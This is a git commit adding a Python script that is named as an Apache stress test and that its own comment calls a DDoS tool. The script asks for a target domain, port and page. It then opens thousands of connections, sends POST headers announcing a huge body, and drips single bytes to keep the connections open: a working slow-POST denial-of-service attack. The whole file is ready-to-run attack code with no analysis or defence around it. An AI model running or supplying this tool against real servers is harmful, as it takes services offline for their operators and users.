14a7c9acb795580d6cb1258878d05a1b2f9063cf
Yaofeng Su <758743960@qq.com>
2019-08-17 11:47:05 +0800

    python test

---
+++ Coding/Apache压力测试.py
@@ -0,0 +1,52 @@
+#!/usr/bin/env python
+import socket
+import time
+import threading
+#Pressure Test,ddos tool
+#---------------------------
+MAX_CONN=20000
+PORT=int(input('请输入攻击端口：'))
+HOST=input('请输入要攻击的域名：')
+PAGE=input('请输入要攻击的页面（默认输入/index.php）：')
+#---------------------------
+ 
+buf=("POST %s HTTP/1.1\r\n"
+"Host: %s\r\n"
+"Content-Length: 10000000\r\n"
+"Cookie: dklkt_dos_test\r\n"
+"\r\n" % (PAGE,HOST))
+ 
+socks=[]
+ 
+def conn_thread():
+    global socks
+    for i in range(0,MAX_CONN):
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        try:
+            s.connect((HOST,PORT))
+            s.send(buf.encode())
+            print ("Send buf OK!,conn=%d\n"%i)
+            socks.append(s)
+        except Exception as ex:
+            print ("Could not connect to server or send error:%s"%ex)
+#end def
+ 
+def send_thread():
+    global socks
+    while True:
+        for s in socks:
+            try:
+                s.send("f".encode())
+                #print "send OK!"
+            except Exception as ex:
+                print ("Send Exception:%s\n"%ex)
+                socks.remove(s)
+                s.close()
+        time.sleep(1)
+#end def
+ 
+conn_th=threading.Thread(target=conn_thread,args=())
+send_th=threading.Thread(target=send_thread,args=())
+ 
+conn_th.start()
+send_th.start()
